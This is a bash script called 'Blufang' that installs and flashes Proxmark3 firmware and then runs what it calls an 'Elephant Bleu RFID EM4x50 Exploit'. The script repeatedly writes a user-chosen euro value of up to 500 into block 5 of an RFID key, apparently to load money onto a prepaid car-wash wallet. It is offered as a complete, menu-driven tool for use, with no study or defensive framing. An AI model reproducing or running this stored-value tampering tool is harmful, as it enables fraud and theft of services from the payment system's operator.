#!/bin/bash
# Script version
scriptVersion=2.0
# Used Device
TTY=/dev/ttyACM0
# Target electronic wallet value
EUR=80


showHelp()
{
	echo ""
	echo ""
	echo -e "\e[96m
	Blufang by Swyx
	\e[39m"
	echo -e "\e[96m
	Version $scriptVersion
	\e[39m"
	echo -e "\e[96m
	Powered by prowmark3 and ElephanBlue by Cryptolok
	https://github.com/RfidResearchGroup/proxmark3/
	https://github.com/cryptolok
	\e[39m"
	echo -e "\e[96m
	Allowed Args
	\e[39m"
	echo -e "\e[96m
	-v or --value :value: // Sets the target wallet value
	-u or --update // Updates the build
	-f of --flash // Updates firmware and bootloader
	-i or --install // Installs the required software (start once)
	-b or --bugfix // Adds driver config and user rights
	-h or --help // Shows basic Help
	--reset // Deletes all app data to reset installation
	\e[39m"
	echo ""
}

update()
{
    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mUpdating Repos\e[39m"
    sudo apt update

    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96minstalling Requiered Software\e[39m"
    	sudo apt upgrade -y
	sudo apt install p7zip git build-essential libreadline-dev libusb-0.1-4 libusb-dev perl pkg-config wget libncurses5-dev gcc-arm-none-eabi libstdc++-arm-none-eabi-newlib libpcsclite-dev pcscd libbz2-dev libclang-dev libssl-dev -y
	sudo apt remove modemmanager -y
	sudo cp -rf driver/77-mm-usb-device-blacklist.rules /etc/udev/rules.d/77-mm-usb-device-blacklist.rules
	sudo udevadm control --reload-rules
	sudo adduser $USER dialout
    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mCloning git\e[39m"
    git clone https://github.com/RfidResearchGroup/proxmark3/
    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mintegrating Custom Scripts\e[39m"
    echo "\
# If you want to use it, copy this file as Makefile.platform and adjust it to your needs
# Run 'make PLATFORM=' to get an exhaustive list of possible parameters for this file.

#PLATFORM=PM3RDV4
PLATFORM=PM3GENERIC
PLATFORM_SIZE=256
STANDALONE=
SKIP_HITAG=1
SKIP_FELICA=1
# If you want more than one PLATFORM_EXTRAS option, separate them by spaces:
#PLATFORM_EXTRAS=BTADDON
#STANDALONE=HF_MSDSAL
" > $PWD/proxmark3/Makefile.platform

    #cp Makefile.platform $PWD/proxmark3/Makefile.platform
    
    cd proxmark3

    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mUpdate pm3\e[39m"
    git pull

    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mComping pm3\e[39m"
    make clean && make all

    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mBuild complete !\e[39m"
    
    cd ..
}

flash()
{
    cd proxmark3

    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mFlashing Firmware\e[39m"
	echo -e "\e[5m\e[33m>>\e[0m\e[39m\e[96mPlease Plug your ProxMark\e[39m"
	./pm3-flash-bootrom
	./pm3-flash-all

	cd ..
}

bugfix()
{
    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mAdding driver Blacklist and User Rights\e[39m"
    sudo cp -rf driver/77-mm-usb-device-blacklist.rules /etc/udev/rules.d/77-mm-usb-device-blacklist.rules
    sudo udevadm control --reload-rules
    sudo adduser $USER dialout
}

injection()
{
echo -e "\033[01;34m"
echo -e "\033[01;34m"
echo '
	           .ed$$$$$eec.
	       .e$$$$$$$$$$$$$$$$$$eeeee$$$$$c
	      d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$c
	    .$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$b.
	    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $b
	   d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F
	  .$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
	  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
	 .$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$**$ ^$$$$
	 4 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*"     4$$F
	 4 '"'"'$$$$$$$$$$$$$$$$$$$$$$$$$$$"        4$$
	 4  $$$$$$$$$$$$$$$$$$$$$$$$$$$        .$$%
	 d   $$$$$          $$$$$*$$$$$$c   ..e$$"
	-    4$$$$          ^$$$$  *$$$$$F  ^"""
	     4$$$$          4$$$$ z$$$$$"
	     4$$$$          4$$$$ ^$$$P
	     ^$$$$b         '"'"'$$$$e  "F
'
echo '
	  ______ _            _                 ____  _            
	 |  ____| |          | |               |  _ \| |           
	 | |__  | | ___ _ __ | |__   __ _ _ __ | |_) | |_   _  ___ 
	 |  __| | |/ _ \ '"'"'_ \| '"'"'_ \ / _` | '"'"'_ \|  _ <| | | | |/ _ \
	 | |____| |  __/ |_) | | | | (_| | | | | |_) | | |_| |  __/
	 |______|_|\___| .__/|_| |_|\__,_|_| |_|____/|_|\__,_|\___|
	               | |                                         
	               |_|                                         
'
echo '	Elephant Bleu RFID EM4x50 Exploit'
echo -e "\e[0m"

let VALUE=EUR*10
LSB=$(printf "%08x" $VALUE)
echo "***	SETTING YOUR ACCOUNT TO $EUR€ USING PUTIN'S BRAIN SUPERPOWERS	***"
sleep 1

echo "#EOF" >> log.txt
mv log.txt log.txt.last
echo "#BlueFang by Swyx" > log.txt

echo -e "\e[0m\e[39m\e[96m [ \e[5m\e[33mWorking\e[0m\e[39m\e[96m ] It can take some time, try to move the key on the antenna\e[39m"

until grep Successfully log.txt
do
	$PWD/proxmark3/client/proxmark3 $TTY -c "lf em 4x50 wrbl -b 5 -d $LSB" >> log.txt
done

sleep 5
}

setVal()
{
	echo "Select value to set 0-500"
	input=0
	while [ $input = 0 ]
	do
		read input
			if ! [ "$input" -eq "$input" ]
		then
			echo "not a valid option"
			echo "default value set"
			echo "Select value to set 0-500"
			input=0
		elif [ "$input" -gt 500 ]
		then
			EUR=500
		else
			EUR=$input
		fi
	done
}


menu()
{
    echo "
    ##############################
    #                            #
    #      Blufang $scriptVersion           #
    #      Main Menu             #
    #                            #
    ##############################
    "

    PS3='>: '
    options=("Set value to $EUR €" "Select value and set" "Install the software" "User/blackist bugfix" "Quit")
    select opt in "${options[@]}"
    do
        case $opt in
            "Set value to $EUR €")
                injection
		break
                ;;
            "Select value and set")
                setVal
		injection
		break
                ;;
            "Install the software")
                update
                flash
		break
                ;;
            "User/blackist bugfix")
                bugfix
		break
                ;;
            "Quit")
                break
                ;;
            *) echo "invalid option $REPLY";;
        esac
    done
}

reset()
{
    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mDeleting Software\e[39m"
    rm -rf proxmark3/
	rm *.txt*
    echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mDeletion Complete\e[39m"
}

# Testing if first arg is NULL
if [ -z "$1" ]
then
	if [ ! -d "proxmark3/" ]
	then
			echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mFirst Start, Updating Build and software and firmware\e[39m"
			sleep 5
			update
			flash
			echo "\n\n\nplease logout and login to refresh user rights\n\n\n"
			exit 0
	else
			menu
			sleep 1
	fi
else
	if [ $1 == "-u" -o $1 == "--update" ]
	then
		update
		exit 0
	elif [ $1 == "-f" -o $1 == "--flash" ]
	then
		flash
		exit 0
	elif [ $1 == "-b" -o $1 == "--bugfix" ]
	then
		bugfix
		exit 0
	elif [ $1 == "-i" -o $1 == "--install" ]
	then
		update
		flash
		echo -e "\e[5m\e[33m++\e[0m\e[39m\e[96mInstallation Complete !\e[39m"
		exit 0
	elif [ $1 == "--reset" ]
	then
		reset
		exit 0
	elif [ $1 == "-v" -o $1 == "--value" ]
	then
		EUR=$2
		injection
	elif [ $1 == "-h" -o $1 == "--help" ]
	then
		showHelp
		exit 0
	else
		echo "Unknown parameter, try \"./blufang.sh --help\""
		exit 0
	fi
fi
